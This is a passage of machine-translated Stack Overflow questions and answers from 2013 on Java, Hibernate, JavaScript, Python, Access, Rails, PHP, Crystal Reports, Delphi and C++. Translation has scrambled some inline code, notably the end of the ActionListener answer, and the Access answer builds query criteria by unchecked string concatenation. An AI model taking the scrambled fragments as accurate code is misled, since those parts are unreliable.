  public A1 (String parameterName) {
      this.parameterName = parameterName;
  }

  public String getParameterName() {
      return parameterName;
  }
} 
```

子类

```
public class B1 extends A1{
@SuppressWarnings("rawtypes")
private Collection dataSource = new ArrayList();

public B1 () {

}

@SuppressWarnings("rawtypes")
public B1 (String parameterName, Collection dataSource) {
    super(parameterName);
    this.dataSource = dataSource;
}

@SuppressWarnings("rawtypes")
public B1 (Collection dataSource) {
    super("B");
    this.dataSource = dataSource;
}

@SuppressWarnings("rawtypes")
public Collection getDataSource() {
    return dataSource;
} 
```

和

```
public class C1 extends A1 {

private String imagePath;

public C1() {

}

protected C1(String parameterName) {
    super(parameterName);
}

public C1 (String parameterName, String imagePath) {
    super(parameterName);
    this.imagePath = imagePath;
}

public String getImagePath() {
    return imagePath;
} 
```

子类在一个集合中

```
List<? extends A1> 
```

解组和编组后的字段将为空（例如：parameterName）。该应用程序不会引发任何异常。

# actionlistener - 简单的动作监听器

> ID：15973756
> 
> 赞同：0
> 
> 时间：2013-04-12T14:19:04.380
> 
> 标签：actionlistener

所以我正在制作一个小游戏，玩家可以在地图上四处游荡并收集东西，但也可能会遇到随机移动的机器人。我正在努力做到这一点，如果玩家站在机器人旁边并点击“战斗”，机器人就会失去健康。

我能想到的唯一方法是在机器人类中创建一个 ActionListener 。所以我试图做出一个“如果”声明，例如，如果玩家在隔壁的瓷砖上，然后点击“战斗”，机器人就会失去健康。但是，我从未使用过 ActionListener，尽管查看了很多示例，但我仍然不理解它们。

机器人在地图上的坐标是“ycord”和“xcord”，玩家用“P”表示。

有没有办法这样说...

```
if(map[ycord+1][xcord].equals("P") && 'fightbutton' is pressed){
                bot.health--; 
```

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:28:07.967

我认为你不应该使用 ActionListener。ActionListeners 需要在创建动作的实例上“注册”，在你的情况下是玩家。所以每个机器人都需要在每个玩家上注册一个 ActionListener，这（在我看来）有点混乱。

相反，我会简单地创建一个由某个高级实例执行的`hitBy(Player)`方法。战斗玩家会做类似的事情，游戏会搜索附近的机器人然后执行。这可以通过简单地遍历包含所有机器人的列表来完成；此列表应在.`Bot``Game``game.madeHit(this)``bot.hitBy(player)``Game`

# java - Hibernate：在多对多关系中添加实体会导致不需要的其他实体更新

> ID：15973758
> 
> 赞同：0
> 
> 时间：2013-04-12T14:19:09.410
> 
> 标签：java, hibernate

使用 Hibernate，给定实体 Payment 和 Refund 之间的多对多关系，并使用乐观锁定`@Version`

```
@Entity
class Payment {
    @Id
    @GeneratedValue
    public Long paymentId;
    @ManyToMany(cascade = CascadeType.ALL, fetch = FetchType.LAZY)
    private List<Refund> refunds = new ArrayList<Refund>();

    @Version
    private long version;
}

@Entity
public class DRefund {
    @Id
    @GeneratedValue
    private Long refundId;

    @ManyToMany(mappedBy = "refunds")
    private List<Payment> payments = new ArrayList<Payment>();

    @Version
    private long version;
} 
```

如果我`Payment`使用 Hibernate 会话从数据库加载一个，然后添加一个`Refund`，然后保存`Refund`使用 Hibernate 会话，`Payment`db 中的行也会更新：

```
insert into Refund (version, refundId) values (?, ?, ?)
update Payment set version=? where paymentId=? and version=?
insert into Payment_Refund (payments_paymentId, refunds_refundId) values (?, ?) 
```

`Payment`没有以任何方式改变。这是必要的还是可以调整休眠映射以避免这种行为？如果我删除`@Version`，`Payment`则不会更新。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:27:11.040

可以使用`@OptimisticLock`注释配置此行为：

```
@ManyToMany(cascade = CascadeType.ALL, fetch = FetchType.LAZY)
@OptimisticLock(excluded = true)
private List<Refund> refunds = new ArrayList<Refund>(); 
```

# javascript - javascript代码来区分ipad和ipad视网膜？

> ID：15973762
> 
> 赞同：0
> 
> 时间：2013-04-12T14:19:15.477
> 
> 标签：javascript, ipad, ipad-3

我正在为 Ipad 开发一个应用程序。所以我需要根据它是 ipad 还是 ipad-retina 来更改图像渲染。那么谁能告诉我如何检测 ipad 和 ipad-retina 之间的区别？谢谢！！！！！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:20:19.667

```
var isRetina = window.devicePixelRatio > 1; 
```

看看这个：[**用 javascript 检测视网膜显示器**](http://briancray.com/posts/detect-retina-displays-with-javascript)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:21:48.227

```
var retina = (window.retina || window.devicePixelRatio > 1); 
```

资源：[http ://hjzhao.blogspot.in/2012/07/detect-retina-display-using-javascript.html](http://hjzhao.blogspot.in/2012/07/detect-retina-display-using-javascript.html)

也使用 Modernizr

[https://github.com/benlister/utilities/tree/master/Modernizr%20Retina%20:%20HiDPI%20test](https://github.com/benlister/utilities/tree/master/Modernizr%20Retina%20:%20HiDPI%20test)

# regex - 使用python解析日志文件并使用sqlite将其有效值存储在数据库中

> ID：15973767
> 
> 赞同：0
> 
> 时间：2013-04-12T14:19:23.177
> 
> 标签：regex, python-2.7, sqlite, python-unicode

嗨，我是 python 的新手。我正在创建一个小程序，它解析特定网站的加载日志文件并将有效数据存储在数据库的特定字段中。但是有些字段具有奇怪的字符，例如“推广频道”。 （非ASCII字符'xe6'）。

我也尝试应用这个问题的解决方案。 [将unicode插入sqlite？](https://stackoverflow.com/questions/9238144/inserting-unicode-into-sqlite) 但是此编解码器无法解码并提供 UnicodeDecodeError: 'charmap' codec can't decode byte 0x81 in position 84: chara cter maps to

```
def db_log_entry(filename):

conn = sqlite3.connect('log.db')
c= conn.cursor()

""" creating log table
Table structure:
    Name          Type
    id            integer
    identifier    text
    url           text
    user_ip       text
    datetime      text
    timezone_mod  text
    query_type    text
    status        text
    opt_id        text
    user_agent    text
    opt_ip        text
    opt_ip_port   text
    """

c.execute(''' CREATE TABLE log
                (id integer, identifier text, url text, user_ip text, datetime text, timezone_mod text, query_type text, query_url text, status text,
                opt_id text, user_agent text, opt_ip text, opt_ip_port text)''')

f=codecs.open(filename,encoding='cp1252') ###   opening file to read data
loop_count=0         # variable to keep record of successful loop iteration
id_count=0           # variable to be entered in id feild of log table

""" Reading each line of log file for performing iterative opertion on each line to parse valid data
 make a entry in database """

for log_line in f:
    loop_count= loop_count+1
    id_count= id_count+1
    list=[]
    db_list=[]

    (txt1,txt2)=log_line.split('HTTP/')        #split the log_line in two parts txt1,txt2 for comparison with reg1,reg2

    reg1= r'(\d{6}_\d{5})\s([\w.-]+)\s([\d.]+)\s-\s-\s\[(\d{2}/\w{3}/\d{4}:\d{2}:\d{2}:\d{2})\s([+-]?\d+)\]\s"(\w+)\s([\w.\-\/]+)'
    reg2= r'[1.1"]?[1.0"]?\s(\d*)\s(\d*)([\s\"\-]*)([\w\.\%\/\s\;\(\:\+\)\?\S\"]+)"\s(\d{2,3}.\d{2,3}.\d{2,3}.\d{2,3})\:(\d+)'

    print 'starting loop ',loop_count
    match= re.search(reg1,txt1)
    if match:                                  # If regex match found between (reg1,txt1) than append the data in db_list
        db_list.append(id_count)
        db_list.append(match.group(1))
        print match.group(1)
        db_list.append(match.group(2))
        print match.group(2)
        db_list.append(match.group(3))
        print match.group(3)
        db_list.append(match.group(4))
        print match.group(4)
        db_list.append(match.group(5))
        print match.group(5)
        db_list.append(match.group(6))
        print match.group(6)
        db_list.append(match.group(7))
        print match.group(7)

        print 'yes 1'
    else:
        print 'match not found in reg1'
    match= re.search(reg2,txt2)                 # If regex match found between (reg2,txt2) than append the data in db_list
    if match:
        db_list.append(match.group(1))
        print match.group(1)
        db_list.append(match.group(2))
        print match.group(2)
        #print match.group(3)
        db_list.append(match.group(4))
        print match.group(4)
        db_list.append(match.group(5))
        print match.group(5)
        db_list.append(match.group(6))
        print match.group(6)
        print 'yes 2'
    else:
        print 'match not found in reg2'

    print 'inserting value of',loop_count
    c.execute('INSERT INTO log VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)',db_list)
    conn.commit()
print 'success...'
conn.commit()

def main():

db_log_entry('access_log.txt')

if __name__ == '__main__':
  main() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:32:57.510

那是因为您使用了错误的字符编码来打开文件。

您应该使用 UTF-8 打开它，如下所示：

```
f=codecs.open(filename,encoding='utf-8') 
```

这是因为 CP-1252 是[拉丁字母的编码，](https://en.wikipedia.org/wiki/Windows-1252)因此无法理解日文字符。

由于我不确定原始编码（或语言）是什么，因此 UTF-8 也是一个安全的选择，因为它[支持所有语言](http://docs.python.org/2/library/codecs.html#standard-encodings)。

# ms-access - 解析访问代码

> ID：15973768
> 
> 赞同：0
> 
> 时间：2013-04-12T14:19:30.880
> 
> 标签：ms-access

我有一个搜索表单，我在访问中创建了一个代码来搜索关键字，然后创建一个包含结果的表：

```
Like"*"&[FORMS]![Search_Form]![KW_Text]&"*" 
```

WHich 基本上告诉它读取我输入的关键字并提取任何匹配的结果。我希望能够输入多个单词，在包含所有数据的表中，我为每一位数据都有多个关键字，所有这些都用逗号分隔。因此，如果我输入 Manager，它会返回包含 Manager 一词的所有结果，我希望能够输入 Manager、Supervisor 并让它返回经理的所有结果和主管的所有结果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T15:51:25.020

您可以使用`SPLIT()`VBA 中的函数将搜索字符串拆分为一个数组，然后`For Each`通过该数组构建一个搜索/过滤字符串，例如

```
(thing LIKE "*Manager*") OR (thing LIKE "*Supervisor*") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:41:14.667

我使用此代码。它在您的刺痛之间创建一个或，由空格分隔。我把这个处理过的字符串放在一个查询定义中

```
Function CreateOr(MyCriteria As String, MyField As String) As String

Dim MyChar As String
Dim MyUniqueCriteria As String
Dim MyFinalCriteria As String
Dim I, j As Integer

j = 0
For I = 1 To Len(MyCriteria)
   MyChar = Mid(MyCriteria, I, 1)

   If MyChar = " " Then

        If j = 0 Then
             MyFinalCriteria = MyFinalCriteria & MyField & "=" & MyUniqueCriteria
        Else
             MyFinalCriteria = MyFinalCriteria & " or " & MyField & "=" & MyUniqueCriteria
        End If

        MyUniqueCriteria = ""
        j = j + 1
   Else
        MyUniqueCriteria = MyUniqueCriteria & MyChar
   End If

Next

CreateOr = MyFinalCriteria

End Function 
```

希望对你有帮助

# javascript - JavaScript splice() 方法的问题

> ID：15973772
> 
> 赞同：1
> 
> 时间：2013-04-12T14:19:37.433
> 
> 标签：javascript, splice

通过在以下示例中使用 JS 中的 splice 方法，我得到了混合的结果：

```
var test = function(x){  
    var f = x.toString().length;
    var bb = [];
    for (i=0;i<f;i++){bb.push('a');}
    console.log(bb);
    for (i=bb.length; i>-1; i=i-3){bb.splice(Number((i-2)),1,'b');}
    console.log(bb);    
};              
test (412289847863); 
```

当输入数字的长度为4、7、10、13等时，'bb'的最后一个元素变成'b'，我不明白为什么。在我看来，它应该始终是“a”。为什么不是？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T15:13:49.630

根据您的评论，您可以尝试此代码。你只需要一个循环并且应该避免拼接，因为它非常昂贵并且如果你想一次只替换一个元素就不需要了。

```
function test(a){
    var l = a.toString().length;
    var bb = [];
    for (var i = l;i>0;i-=1){
        bb[i-1] = ((l-i+2)%3!=0)?"a":"b";
    }
    console.log(bb);
}

test(1343332); 
```

# javascript - 使用 LABjs 的错误执行顺序

> ID：15973784
> 
> 赞同：2
> 
> 时间：2013-04-12T14:20:03.603
> 
> 标签：javascript, labjs

我做了一个非常简单的例子（改编自我的真实项目），它使用 LABjs (v2.0.3) 加载 javascript 文件并以给定的顺序执行它们。我正在粘贴下面的代码。

*   由于 testLAB.js 等待 mainCanvas.js，而 mainCanvas.js 等待 events.js，我希望警报的顺序是：“events.js”“mainCanvas.js”“testLAB.js”。
*   但是，我通常得到相反的顺序：“testLAB.js”“mainCanvas.js”“events.js”。
*   有时我会得到“testLAB.js”“events.js”“mainCanvas.js”。

谁能解释一下？
完整的例子可以在[这里](https://dl.dropboxusercontent.com/u/33570899/testLAB.zip)下载。

编辑：我正在使用 node.js 和[http-server 模块](https://npmjs.org/package/http-server)在本地提供这些页面（以防您也想在本地尝试）

文件：index.html

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Test lab.js</title>
    <script src="js/lib/LAB.js"></script>
    <script src="js/app/testLAB.js"></script>
</head>
<body>
</body>
</html> 
```

文件：js/app/testLAB.js

```
$LAB.setGlobalDefaults({
    BasePath: "/js/",
    Debug:true
});

$LAB
.script("lib/underscore.min.js")
.script("app/mainCanvas.js").wait(function(){
    alert("testLAB.js");
}); 
```

文件：js/app/mainCanvas.js

```
$LAB
.script("lib/jquery.js").wait()
.script("lib/underscore.min.js")
.script("app/events.js")
.wait(function() {
    alert("mainCanvas.js");
}); 
```

文件：js/app/events.js

```
$LAB
.script("lib/jquery.js")
.script("lib/underscore.min.js")
.wait(function() {
alert("events.js");
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T17:20:52.180

这里的问题是对 LABjs 的工作原理的误解，或者更确切地说，是对嵌套动态脚本加载的工作原理的误解。

如果我使用脚本加载器加载脚本 A.js，浏览器将下载然后执行该脚本的内容，在脚本 A 中，我使用脚本加载器加载脚本 B.js，事实上脚本 A.js要求 B.js 加载并不意味着 A.js 的“加载”事件被神奇地阻止，直到依赖项（即在本例中为 B.js）完成加载和执行。

脚本加载后，浏览器会立即执行，一旦主要执行完成，浏览器将在该脚本上触发“加载”事件，表明它已完成。如果该脚本触发了其他一些异步行为，例如加载更多脚本，则该异步行为将不会影响主执行线程或触发该脚本的“加载”事件。

如果您需要加载嵌套依赖项，您将需要一个更复杂的系统来“延迟”每个文件的执行，类似于 AMD 加载器（如 Require.js）如何将所有代码包装在函数中。该技术起作用的原因是被声明的外部函数的执行顺序无关紧要，因为在定义了所有代码之后，您可以返回并以各种正确的顺序执行这些函数有效负载并获得您期望的顺序。

* * *

如果您不想走 AMD/Require 路线，另一个（更简单的？）选项是我个人所做的，是使用一个简单的构建工具脚本，在构建时读取您的 JS 文件，发现所有内容嵌套的依赖项是，并以正确的顺序将它们全部“提升”到一个“全局”$LAB 链调用中。因此，在您的文件中，不要使用实际的 $LAB 调用声明嵌套依赖项，而只需使用 JS 注释中的依赖关系表示法，然后让您的脚本查找这些依赖项。

示例（类似于我自己做事的方式）：

A.js：

```
// needs "B.js"
// needs "C.js"

A.something = function( /*..*/ ) { /*..*/ };    
B.something();
C.something(); 
```

B.js：

```
// needs "D.js"

B.something = function( /*..*/ ) { /*..*/ };
D.something(); 
```

C.js：

```
// needs "D.js"
// needs "E.js"

C.something = function( /*..*/ ) { /*..*/ };
D.something();
E.something(); 
```

D.js：

```
D.something = function( /*..*/ ) { /*..*/ }; 
```

E.js：

```
E.something = function( /*..*/ ) { /*..*/ }; 
```

然后，我有一个简单的脚本来查看我的文件，并发现必要的执行顺序，以便满足所有依赖项。

然后它会生成一个 $LAB 链供我的主页使用，如下所示：

```
$LAB
.script("D.js")
.script("E.js").wait() // D and E can execute in either order
.script("B.js")
.script("C.js").wait() // B and C can execute in either order
.script("A.js")
.wait(function(){
   alert("Everything is loaded!");
}); 
```

像我建议的方法的唯一警告是你不能做循环依赖（比如 C 依赖于 B 和 B 依赖于 C）。如果您需要循环依赖，请转到 AMD/Require.js。

# ruby - 如何在我的视图中输出特定类别？

> ID：15973791
> 
> 赞同：0
> 
> 时间：2013-04-12T14:20:23.293
> 
> 标签：ruby, ruby-on-rails-3

我有一个 Rails 3 博客应用程序，其中有文章和类别“类别属于_to：文章”文章 has_many：类别，现在我有不同的类别，其中有很多文章，例如包含所有运动文章的运动类别，我想要在我的应用程序布局中只想在 div 上显示体育文章，请告诉我如何去做。谢谢你 ...

```
class Article < ActiveRecord::Base
  attr_accessible :category_id, :content, :excerpt, :title, :image, :remote_image_url 
  mount_uploader :image, ImageUploader
  belongs_to :category
  validates :title, :content, :excerpt,  :category_id,  presence: true
  validates :title, uniqueness: true

  extend FriendlyId
  friendly_id :title, use: [:slugged, :history]

  def long_title
    " #{title} - #{created_at}   "   
  end
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:23:37.503

根据您的评论更新：

第一步，获取所有类别，假设您在 categories#index 操作中执行此操作：

```
def index
  @categories = Category.all
end 
```

现在我们将在 categories#index 视图中使用该类别的名称创建一个指向每个类别的链接。当用户点击一个类别时，他们将被带到该类别的显示页面，我们将在其中列出所有相关文章：

```
<% @categories.each do |category| %>
  <%= link_to category.name, category %>
<% end %> 
```

我们在 categories#show 操作中添加以下内容：

```
def show
  @category = Category.includes(:articles).find(params[:id])
  @articles = @category.articles
end 
```

`@articles`然后，您可以通过在相应的 categories#show 视图中迭代变量来显示所有这些文章。例如，将它们作为链接添加到某个 div 中：

```
<div class="articles">
  <% @articles.each do |article| %>
    <%= link_to article.title, article %><br>
  <% end %>
</div> 
```

现在在文章控制器中为显示操作执行相同的操作：

```
def show
  @article = Article.find(params[:id])
end 
```

所以基本上用户会看到一个显示“体育”的链接，当他点击它时，他将被带到一个页面，比如`yoursite.com/categories/4`或者`yoursite.com/categories/sports`如果你正在使用`friendly_id`. 在此页面下将列出所有相关的体育文章，当点击它们时，用户将被带到该文章的显示页面。

# java - android MultiAutoCompleteTextView - 在其中显示自定义视图

> ID：15973796
> 
> 赞同：6
> 
> 时间：2013-04-12T14:20:34.780
> 
> 标签：java, android, android-edittext, autosuggest

我正在使用电子邮件联系建议实施 MultiAutoCompleteTextView。我想要的是在 MultiAutoCompleteTextView 内容而不是字符串中显示联系人徽章。Gmail Android 应用程序可以做到这一点。基本上，我希望在我输入/选择联系人后，下拉菜单中显示的内容会显示在 MultiAutoCompleteTextView（联系人照片、姓名和电子邮件）中。可能吗？

![肖特](https://i.stack.imgur.com/M7IJ9.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T01:13:49.270

谷歌通过使用自定义 ImageSpan 来做到这一点。我刚刚为我的一个应用程序成功实现了这一点。您应该查看 RecipientEditTextView.java 以了解他们是如何做到的。本质上，他们通过 Canvas 创建一个可绘制对象，并将该可绘制对象分配给自定义 ImageSpan。我不能发布任何代码，因为......好吧有很多，但是你应该通过源代码找到一个好主意。

# ruby - 保持 ruby 进程永远运行的最佳方法是什么？

> ID：15973797
> 
> 赞同：3
> 
> 时间：2013-04-12T14:20:39.823
> 
> 标签：ruby

我必须运行一个 file.rb 每秒执行一个微任务（将 qwuery 插入数据库）。

我使用了一个 for 循环 (1..10^9) 但我收到了 CPU 使用率超出警报！那么不浪费所有 CPU 的最佳方法是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-12T17:16:50.773

永远运行的最简单方法就是循环

```
loop do
  run_db_insert
  sleep 1
end 
```

如果保持 1 Hz 的速率很重要，请注意 db 插入需要一些时间，因此一秒睡眠意味着每个周期需要 dbtime+1 秒，您将逐渐落后。如果数据库交互可靠地少于一秒，您可以修改睡眠以调整下一秒的间隔。

```
loop do
  run_db_insert
  sleep(Time.now.to_f.ceil - Time.now.to_f)
end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:33:50.493

`sleep`带有命令的简单循环应该可以完成这项工作。

```
while true
    # do stuff here
    sleep 1 # wait one second
end 
```

# php - 从另一个类调用 PHP PDO 包装类

> ID：15973798
> 
> 赞同：1
> 
> 时间：2013-04-12T14:20:40.263
> 
> 标签：php, oop, class, pdo

我打算从这里使用 PHP PDO 包装类：[http ://www.imavex.com/php-pdo-wrapper-class/](http://www.imavex.com/php-pdo-wrapper-class/)

我初始化了这个类：
`$db = new db("mysql:host=$sitedbHost;port=3306;dbname=$sitedbName", "$sitedbUser", "$sitedbPass");`

问题是，我不喜欢`global $db`在我的其他类的每个函数上做这样的想法：

```
class User
{
    function getUserDomains($user_id)
    {
        global $db;
        return $db->select("domains");
    }
} 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:50:39.367

如果你的类需要它才能工作，你可以在构造函数中**注入它：**

```
class User {

    public function __construct(Database $db) {
        $this->db = $db;
    }

} 
```

然后，您可以从 访问数据库对象`$this->db`。（注意，我假设`$db`是`Database`该类的一个实例。根据需要进行更改）。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-07-04T13:26:07.247

这是给你的东西：

[在 GitHub 上](https://github.com/neerajsinghsonu/PDO_Class_Wrapper)检查新的PDO 类包装器

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2013-04-12T14:47:05.073

> 我不喜欢在我的其他类的每个函数上创建全局 $db 的想法

好吧，仅在构造函数中将其设为全局（或将其作为参数传递），然后用作类变量，

```
return $this->db->select("domains"); 
```

老实说，您无法避免以某种方式将 $db 传递给函数。没有魔法。无论您选择哪种时尚方式，您最终都会以这种或其他方式设置您的 $db 变量，无论它如何被称为“依赖注入”、“全局”或“使用原力，卢克”。

我会投赞成票，`global`因为它简单明了。

顺便说一句，这个框架不灵活且不安全。更好地使用[safeMysql](https://github.com/colshrapnel/safemysql#safemysql)，因为它更安全、更灵活

# crystal-reports - 交叉表报告如何计算特定列的值并从行总数中减去

> ID：15973801
> 
> 赞同：1
> 
> 时间：2013-04-12T14:20:46.673
> 
> 标签：crystal-reports, crosstab, calculated-columns

我被困在**交叉表报告**中，我只需要两列值的总和，然后减去总值我应该怎么做？

如下所示，

```
 Product 1    Product2    Product 3    Total
                   ----------------------------------
           Cust 1      4           5           2          11
           Cust 2      5           9           7          19 
```

我想对“产品 1”、“产品 3”的值求和。然后从行总数中减去=> Total LIKE [4+2]-11=>TOtal。并想为每个客户重复这个..

任何人请帮帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T06:47:28.343

我不确定何时引入嵌入式摘要，但我很确定您的 Crystal 版本具有此功能。如果不是我提前道歉。我现在只使用这种方法几个月了，起初它很混乱。至少对我来说，但它已经派上用场了......我正在对您的交叉表做出以下假设。根据需要更改名称

*   行 {yourtable.CustID}
*   {yourtable.product} 列
*   汇总字段 {yourtable.cost}

*   在交叉表的左上角，右键单击转到高级计算并选择计算成员

    *   选择新建并输入说明
*   对于类型：选择列
*   对于插入评估：选择之后
*   单击编辑插入值并输入
    `CurrentColumnIndex=(GetNumColumns-2)//This will insert a column just before the total column`
*   单击编辑标题公式并在引号中输入您要调用的列
*   选择值公式中的内容，然后单击编辑值公式和数值
*   保存并关闭然后退出计算成员专家您的交叉表现在应该有一个新列右键单击值转到计算成员并选择编辑计算公式
*   输入这个公式

`( GridValueAt (CurrentRowIndex,0 , 0) // Product 1 value + GridValueAt (CurrentRowIndex,2 , 0) // Product 2 value ) - GetTotalValueFor "yourtable.product")`

注意：天哪，很难在这个网站上发帖！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T06:24:50.123

想了很久之后，我已经完成了......

首先要明确的是，水晶报表 10 不提供以下功能“CurrentRowIndex”、“GridValueAt”，这就是为什么“CoSpringsGuy”的上述解决方案不适用......

因为我们有两张桌子。1 个客户和第 2 个产品，我们生成交叉表，其中包含 product_sold (Qty) 的汇总字段和 2 个交叉表列“Product.name”和子列产品。类型

现在我们想在 product.packing type =“Pilot” 下对每个客户销售的产品的价值求和，然后从所有产品的总和中减去总和（产品类型“Normal”和“Pilot”）

对于这个问题，首先我们必须在水晶运行时格式化公式并操作汇总字段的“显示字符串”然后我们将编辑总计，即最后一列

第一次编辑在以下代码的帮助下汇总了“显示字符串”

```
Global CCust As String  to keeping last customer for teli new customer name
Global Ccol As String ' tht is for keeping last  column/product.packing type and teli with new col
Global Rndx as number ' this is for generating index of the row
Global totperx(22) as number ' is to hold the currnt value of cell and adding with previous value 
                              ' and i imagen that number of customers will less then 22 otherwise you can take unlimited array

Whileprintingrecords
if (CCust="") then
   CCust=gridrowcolumnvalue("Table_Cust.Name")
   Ccol=gridrowcolumnvalue("Viw_Prod.Packing")
   Rndx=1
   formula="new"
end if

if CCust<>gridrowcolumnvalue("Viw_Prod.Packing") then
    formula="same"
    Rndx=Rndx+1
else
    formula="Newag"
end if

if Ccol<>gridrowcolumnvalue("Viw_Prod.Packing") then
    Rndx=1
end if

if gridrowcolumnvalue("Viw_Prod.Packing")="Pilot" then
    totperx(Rndx)=totperx(Rndx)+currentfieldvalue
end if

formula=totext(currentfieldvalue,0,"") ' despite of cstr function totext will change 45 to 45 while cstr changes 45 to 45.00
CCust=gridrowcolumnvalue("Table_Cust.Name")
Ccol=gridrowcolumnvalue("Viw_Prod.Packing") 
```

现在我们将编辑总计列的“显示字符串”

```
Global my as number
Global totperx(22) as number
whileprintingrecords
if my<1 then
my=1
end if
formula=currentfieldvalue-totperx(my)
my=my+1 
```

# delphi - 如何在Delphi中调用TObjectDictionary的继承构造函数

> ID：15973806
> 
> 赞同：1
> 
> 时间：2013-04-12T14:20:54.950
> 
> 标签：delphi, generics, constructor, inherited

在阅读了 TDictionary 相对于 TStringList 的显着性能改进后，我创建了以下类：

```
 TAnsiStringList = class(TObjectDictionary<AnsiString,TObject>)
    public
      constructor Create(const OwnsObjects: Boolean = True); reintroduce;
      destructor Destroy; override;
      procedure Add(const AString: AnsiString);
      procedure AddObject(const AString: AnsiString; AObject: TObject);
    end; 
```

我这样编写构造函数：

```
 { TAnsiStringList }

    constructor TAnsiStringList.Create(const OwnsObjects: Boolean = True);
    begin
      if OwnsObjects then
        inherited Create([doOwnsKeys,doOwnsValues])
      else
        inherited Create;
    end; 
```

...期望这个 TObjectDictionary 构造函数将被调用：

```
 constructor Create(Ownerships: TDictionaryOwnerships; ACapacity: Integer = 0); overload; 
```

...如果指定了 Ownerships 参数。如果没有指定 Ownerships 参数，我预计会调用以下继承的 TDictionary 构造函数：

```
 constructor Create(ACapacity: Integer = 0); overload; 
```

代码编译并运行，但是当我调用

```
 inherited Create([doOwnsKeys,doOwnsValues]) I get the following error: 
```

无效的类类型转换

有谁看到我做错了什么，有没有合适的方法来做到这一点？

TIA

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-12T14:28:44.467

问题是您要求容器`Free`在移除项目时调用您的键。但是您的密钥不是类，因此这是一个无效的请求。这是在运行时而不是编译时捕获的，因为直到运行时才确定所有权。

您只想要`doOwnsValues`并且应该删除`doOwnsKeys`.

```
 if OwnsObjects then
    inherited Create([doOwnsValues])
 else
   inherited Create; 
```

* * *

对于它的价值，如果你试图制作一个`AnsiString`等价于`TStringList`，那么你的方法是有缺陷的。字符串列表是有序容器，但字典不是。您将无法按整数索引、按顺序迭代等等。我也不明白为什么要强制此类的所有使用者将对象声明为 type `TObject`。您应该将该参数留给消费者指定。这就是泛型的美妙之处。

也许你不想要一个有序的容器，在这种情况下你需要一本字典。但在这种情况下，您根本不需要创建新类。您可以`TObjectDictionary`按原样使用。

如果您对创建子类一无所知，那么我会这样做：

```
type
  TAnsiStringDict<T: class> = class(TObjectDictionary<AnsiString, T>) 
```

这将允许类的使用者决定他们将哪种类型的对象放入字典中，并保持编译时类型安全。

所以，当你想要一个列表框的字典时，你可以声明一个像这样的变量：

```
var
  ListBoxDict: TAnsiStringDict<TListBox>; 
```

# c++ - 删除空格，转换大小写，除引号外的字符串

> ID：15973809
> 
> 赞同：0
> 
> 时间：2013-04-12T14:21:02.360
> 
> 标签：c++

我正在使用没有 Boost 的 C++03。

假设我有一个字符串，例如.. 日期是“星期一”

我想处理这个

THEDAYIS星期一

也就是说，将引号中没有的内容转换为大写，并删除引号中没有的空格。

该字符串可能不包含引号，但如果包含，则只有 2 个。

我尝试使用 STL 算法，但我被困在如何记住它是否在引号中或不在元素之间。

当然，我可以用旧的 for 循环来做到这一点，但我想知道是否有一种花哨的 C++ 方式。

谢谢。

这就是我使用 for 循环的原因

```
while (getline(is, str))
{
    // remove whitespace and convert case except in quotes
    temp.clear();
    bool bInQuote = false;
    for (string::const_iterator it = str.begin(), end_it = str.end(); it != end_it; ++it)
    {
        char c = *it;

        if (c == '\"')
        {
            bInQuote = (! bInQuote);
        }
        else
        {
            if (! ::isspace(c))
            {
                temp.push_back(bInQuote ? c : ::toupper(c));
            }
        }
    }
    swap(str, temp); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T15:23:01.403

只是为了一笑而过，使用自定义迭代器[`std::copy`](http://en.cppreference.com/w/cpp/algorithm/copy)和 a [`std::back_insert_iterator`](http://en.cppreference.com/w/cpp/iterator/back_insert_iterator)，以及`operator++`知道跳过空格并在引号字符上设置标志的 an：

```
CustomStringIt& CustomStringIt::operator++ ()
{
    if(index_<originalString_.size())
        ++index_;

    if(!inQuotes_ && isspace(originalString_[index_]))
        return ++(*this);

    if('\"'==originalString_[index_])
    {
        inQuotes_ = !inQuotes_;
        return ++(*this);
    }

    return *this;
}

char CustomStringIt::operator* () const
{
    char c = originalString_[index_];
    return inQuotes_ ? c : std::toupper(c) ; 
} 
```

[完整代码在这里。](http://liveworkspace.org/code/3g4XSs%240)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:59:40.167

您可以使用 STL 算法执行以下操作：

```
#include <iostream>
#include <string>
#include <algorithm>
#include <cctype>

using namespace std;

struct convert {
   void operator()(char& c) { c = toupper((unsigned char)c); }
};

bool isSpace(char c)
{
  return std::isspace(c);
}

int main() {

    string input = "The day is \"Mon Day\" You know";
    cout << "original string: " << input <<endl;

    unsigned int firstQuote = input.find("\"");
    unsigned int secondQuote = input.find_last_of("\"");

    string firstPart="";
    string secondPart="";
    string quotePart="";
    if (firstQuote != string::npos)
    {
       firstPart = input.substr(0,firstQuote);
       if (secondQuote != string::npos)
       {
          secondPart = input.substr(secondQuote+1);
